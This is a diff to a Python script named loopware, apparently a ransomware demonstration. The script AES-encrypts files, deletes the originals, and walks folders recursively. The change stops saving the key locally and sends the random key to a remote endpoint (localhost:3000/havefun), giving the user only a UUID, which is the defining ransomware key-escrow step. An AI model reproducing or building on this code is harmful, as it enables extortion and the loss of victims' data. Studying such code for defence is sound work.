@@ -28,8 +28,9 @@ import re
 import imp
 import sys
 import os
-
 import glob
+import urllib.request
+import json
 from Crypto.Cipher import AES
 from Crypto.Hash import SHA256
 from subprocess import Popen, PIPE
@@ -47,7 +48,7 @@ URL = "https://github.com/Alevsk/loopware"
 # Maximum length of left option column in help listing
 MAX_HELP_OPTION_LENGTH = 20
 
-BANNER = """                  
+BANNER = """
 ( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)
 ( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)
 ( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)
@@ -57,11 +58,15 @@ BANNER = """
 EXAMPLES = """
 Examples:
 python3 loopware.py -f secret.txt --encrypt
-python3 loopware.py -f secret.txt -p key.secret --decrypt 
+python3 loopware.py -f secret.txt -p key.secret --decrypt
 python3 loopware.py -F my_secret_folder/ --encrypt --recursive
 python3 loopware.py -F my_secret_folder/ -p key.secret --decrypt --recursive
 python3 loopware.py --help
 """
+
+SERVER = "http://localhost"
+PORT = ":3000"
+ENDPOINT = "/havefun"
 
 def encrypt(key, fileName):
 
@@ -111,9 +116,16 @@ def decrypt(key, fileName):
 
 def generateKey():
 	secret = bytearray(os.urandom(2048))
-	sFile = open('key.secret', 'wb')
-	sFile.write(secret)
-	sFile.close()
+	# sFile = open('key.secret', 'wb')
+	# sFile.write(secret)
+	# sFile.close()
+	request = urllib.request.Request(
+		SERVER + PORT + ENDPOINT,
+        secret
+	)
+	response = urllib.request.urlopen(request)
+	jres = json.loads(response.read())
+	print("Your private key uuid is: %s\n" % jres['uuid'])
 	hasher = SHA256.new(secret)
 	secret = None
 	return hasher.digest()
@@ -160,7 +172,7 @@ def parse_args():
 
 	if args.decrypt and not args.password:
 		parser.error("Required password file is missing. Use '-h' for help.")
-	
+
 	return args
 
 def main():
@@ -178,7 +190,7 @@ def main():
 		else:
 			if os.path.isfile(args.password):
 				decrypt(getKey(args.password), args.file)
-		
+
 		print("%s %s" % (INFO, args.file))
 		os.remove(args.file)
 
@@ -192,7 +204,7 @@ def main():
 					encrypt(secret, filename)
 					os.remove(filename)
 					total += 1
-			
+
 			print("\n%s Files encrypted: %d" % (INFO, total))
 
 		else:
